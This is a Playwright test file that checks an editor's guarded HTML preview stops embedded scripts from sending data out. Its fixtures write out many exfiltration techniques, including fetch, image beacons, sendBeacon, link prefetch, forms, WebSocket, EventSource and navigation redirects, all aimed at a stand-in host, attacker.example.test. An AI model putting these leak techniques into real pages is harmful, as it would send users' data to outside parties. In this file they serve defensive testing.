import { expect, test, type Page } from "@playwright/test";
import { buildGuardedPreviewDocument } from "../packages/views/editor/utils/html-egress-guard";

const ATTACKER = "https://attacker.example.test";

// Every way out a script in the preview has, each to its own path.
const LEAKS = `<script>
  fetch("${ATTACKER}/fetch?d=secret").catch(() => {});
  new Image().src = "${ATTACKER}/img?d=secret";
  navigator.sendBeacon("${ATTACKER}/beacon?d=secret");
  for (const rel of ["prefetch", "preload", "stylesheet", "dns-prefetch", "preconnect"]) {
    const link = document.createElement("link");
    link.rel = rel; link.as = "fetch"; link.href = "${ATTACKER}/link-" + rel;
    document.head.appendChild(link);
  }
  const frame = document.createElement("iframe");
  frame.src = "${ATTACKER}/frame";
  document.body.appendChild(frame);
  const form = document.createElement("form");
  form.action = "${ATTACKER}/form"; form.method = "post";
  document.body.appendChild(form);
  try { form.submit(); } catch (_) {}
  try { new WebSocket("wss://attacker.example.test/ws"); } catch (_) {}
  try { new EventSource("${ATTACKER}/sse"); } catch (_) {}
</script>`;

async function mount(page: Page, html: string) {
  await page.setContent(`<script>window.messages = [];
    addEventListener("message", (e) => {
      if (e.source === document.getElementById("preview").contentWindow) window.messages.push(e.data);
    });</script><iframe id="preview" sandbox="allow-scripts"></iframe>`);
  await page.locator("#preview").evaluate((frame, srcdoc) => {
    (frame as HTMLIFrameElement).srcdoc = srcdoc as string;
  }, buildGuardedPreviewDocument(html, "preview"));
}

// Requests that reach the network, not ones the browser refuses first.
async function countRequests(page: Page) {
  const seen: string[] = [];
  await page.route(`${ATTACKER}/**`, (route) => {
    seen.push(route.request().url());
    return route.fulfill({ body: "leaked" });
  });
  page.on("websocket", (ws) => seen.push(ws.url()));
  return seen;
}

test.describe("HTML preview egress", () => {
  test("sends nothing out of the preview", async ({ page }) => {
    const seen = await countRequests(page);
    await mount(page, `<p>report</p>${LEAKS}`);
    await page.waitForTimeout(1500);
    expect(seen).toEqual([]);
  });

  test("can't navigate its frame away with data in the address", async ({ page }) => {
    const seen = await countRequests(page);
    for (const way of [
      `location.href = "${ATTACKER}/nav?d=secret"`,
      `location.replace("${ATTACKER}/replace?d=secret")`,
      `open("${ATTACKER}/open?d=secret", "_self")`,
      `document.body.insertAdjacentHTML("beforeend", '<a id="a" href="${ATTACKER}/link?d=secret">x</a>'); document.getElementById("a").click()`,
    ]) {
      await mount(page, `<script>${way}</script>`);
      await page.waitForTimeout(800);
    }
    expect(seen).toEqual([]);
  });

  test("still runs its scripts and libraries, and talks to the app both ways", async ({ page }) => {
    await page.route("https://cdn.jsdelivr.net/npm/**", (route) =>
      route.fulfill({ contentType: "text/javascript", body: "window.Lib = { ok: true };" }),
    );
    await mount(
      page,
      `<script src="https://cdn.jsdelivr.net/npm/some-lib"></script>
      <script>
        parent.postMessage({ lib: !!(window.Lib && window.Lib.ok) }, "*");
        addEventListener("message", (e) => { if (e.source === parent) parent.postMessage({ echo: e.data }, "*"); });
      </script>`,
    );
    await expect.poll(() => page.evaluate(() => (window as unknown as { messages: unknown[] }).messages)).toContainEqual({
      lib: true,
    });
    await page.evaluate(() => (document.getElementById("preview") as HTMLIFrameElement).contentWindow!.postMessage("ping", "*"));
    await expect.poll(() => page.evaluate(() => (window as unknown as { messages: unknown[] }).messages)).toContainEqual({
      echo: "ping",
    });
  });
});
